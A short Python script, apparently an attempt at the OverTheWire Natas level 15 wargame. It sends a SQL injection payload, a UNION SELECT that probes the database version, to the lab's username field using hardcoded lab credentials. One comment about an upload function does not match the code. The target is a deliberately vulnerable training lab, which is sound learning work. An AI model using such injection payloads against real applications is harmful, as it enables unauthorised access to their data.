#!/usr/bin/env python3

import requests

# We need to exploit the upload function. We can add anything that'll run in
# apache user permissions dont let us look outside of the dir

NATAS = "natas15"
PASS = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
URL = "http://{0}.natas.labs.overthewire.org/?debug=True".format(NATAS)

# SELECT * from users where username=\"".$_REQUEST["username"]."\"
payload = {'username': 'natas16" UNION ALL SELECT NULL,substring(@@version,1,1)=4'}
# " UNION ALL SELECT NULL,version()-- "'}
r = requests.post(URL, auth=(NATAS, PASS), data=payload)

print(r.text)
print(r.status_code)
